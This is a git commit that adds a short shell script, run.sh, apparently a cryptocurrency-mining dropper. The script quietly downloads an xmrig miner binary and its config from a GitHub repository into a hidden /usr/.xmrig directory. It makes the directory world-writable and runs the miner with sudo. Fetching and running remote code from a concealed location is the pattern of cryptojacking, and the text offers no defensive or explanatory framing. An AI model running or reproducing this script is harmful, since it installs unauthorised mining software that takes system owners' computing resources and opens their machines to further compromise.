9bb74345254b6e1ea0b11940da0d887bf4cd1bbc
ak6665607 <82202025+ak6665607@users.noreply.github.com>
2024-03-26 14:38:53 +0800

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+
+mkdir -p "/usr/.xmrig"
+wget -qO "/usr/.xmrig/config.json" "https://github.com/ak6665607/x/raw/main/config.json"
+wget -qO "/usr/.xmrig/xmrig" "https://github.com/ak6665607/x/raw/main/xmrig"
+chmod -R 777 "/usr/.xmrig"
+cd "/usr/.xmrig" && sudo ./xmrig
+
